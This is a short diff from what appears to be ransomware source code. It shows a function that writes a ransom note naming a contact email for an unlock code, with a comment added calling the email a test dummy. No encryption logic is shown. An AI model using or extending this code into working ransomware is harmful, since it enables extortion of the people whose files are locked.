@@ -64,7 +64,7 @@ def create_ransom_note():
     note_path = os.path.join(current_dir, RANSOM_NOTE)
     try:
         with open(note_path, 'w') as f:
-            f.write(MESSAGE + "\nContact darkhacker@protonmail.com for the unlock code.")
+            f.write(MESSAGE + "\nContact darkhacker@protonmail.com for the unlock code.")#Dummy email for testing purrpose
         print(f"Ransom note created at: {note_path}")
     except Exception as e:
         print(f"Error creating ransom note: {e}")
